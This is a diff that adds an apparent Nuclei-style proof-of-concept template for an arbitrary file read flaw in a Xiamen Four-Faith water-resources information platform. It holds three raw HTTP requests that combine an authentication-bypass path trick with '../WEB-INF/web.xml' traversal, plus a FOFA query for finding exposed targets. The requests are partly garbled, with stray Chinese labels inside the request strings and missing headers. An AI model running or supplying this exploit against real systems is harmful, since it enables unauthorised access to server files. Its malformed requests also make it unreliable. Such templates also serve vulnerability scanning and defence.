@@ -1,0 +1,49 @@
+id: poc-dvyme3l0d262qi93
+info:
+  name: 厦门四信通信科技有限公司水利信息化平台download.do存在任意文件读取漏洞
+  author: hacktwo
+  severity: high
+  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/dvyme3l0d262qi93'
+  tags: lfi,2026
+  metadata:
+    source: yuque-hacktwo-dtdx2v
+    doc-slug: dvyme3l0d262qi93
+    fofa: title="水利信息化平台V2.2登录页面"
+http:
+- raw:
+  - 'GET /generalReport/download.do;userLogin.do;?fileName=../WEB-INF/web.xml HTTP/1.1
+
+    Host: {{Hostname}}
+
+    User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:147.0) Gecko/20100101 Firefox/147.0
+
+    Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+
+    Accept-Language: zh-CN,zh;q=0.9,zh-TW;q=0.8,zh-HK;q=0.7,en-US;q=0.6,en;q=0.5
+
+    Accept-Encoding: gzip, deflate
+
+    Connection: close
+
+    接口2：'
+  redirects: false
+  matchers:
+  - status:
+    - 200
+    type: status
+- raw:
+  - 'GET /statistic/download.do;userLogin.do;?fileName=../WEB-INF/web.xml HTTP/1.1
+
+    接口3：'
+  redirects: false
+  matchers:
+  - status:
+    - 200
+    type: status
+- raw:
+  - GET /stAlarmInfo/download.do;userLogin.do;?fileName=../WEB-INF/web.xml HTTP/1.1
+  redirects: false
+  matchers:
+  - status:
+    - 200
+    type: status
